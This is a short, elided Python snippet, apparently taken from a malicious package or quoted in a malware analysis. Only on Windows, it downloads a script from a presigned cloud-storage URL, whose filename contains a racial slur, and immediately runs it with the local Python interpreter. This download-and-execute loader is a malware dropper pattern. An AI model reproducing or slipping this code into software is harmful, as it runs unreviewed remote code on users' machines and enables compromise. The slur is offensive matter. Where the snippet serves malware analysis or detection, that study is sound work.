...
if os.name == 'nt':
    ...
    remote_script_url = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/YOsObbVSRdM7n6CvzGJ8uDaP1Cp2/9130a70d-b0c0-419c-a582-21d0173b1871?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240511%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20240511T214706Z&X-Amz-Expires=43200&X-Amz-Signature=235ca19ebd7bf61c82187a9bfa58b071f659ed0df452851d722afb4b633299aa&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22niggsdd.py%22"
    ...
    # Execute the downloaded script using the Python executable
    python_executable = sys.executable
    subprocess.run([python_executable, temp_file_path])
else:
    print("This script can only be executed on Windows.")